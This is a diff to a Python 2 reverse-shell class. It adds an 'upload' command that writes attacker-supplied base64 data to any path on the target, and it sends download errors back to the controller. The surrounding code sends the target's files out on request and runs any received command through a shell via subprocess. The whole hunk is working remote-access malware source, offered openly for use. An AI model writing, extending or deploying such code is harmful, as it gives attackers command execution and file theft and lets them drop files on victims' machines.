@@ -64,7 +64,16 @@ class reverse_shell:
                     with open(command[9:],"rb") as file_for_upload:
                         self.reliable_send(base64.b64encode(file_for_upload.read()))
                 except:
-                    print "error: no such file"
+                    self.reliable_send("error: no such file")
+            elif len(command)>=6 and command[:6] == "upload":
+                uploaded_data = self.reliable_recv()
+                if not uploaded_data == "failed":
+                    with open(command[7:], "wb") as uploaded_file:
+                        uploaded_file.write(base64.b64decode(uploaded_data))
+                        continue
+                else:
+                    continue
+                    #print "error "+ command[7:]
             else:
                 try:
                     process = subprocess.Popen(command , shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
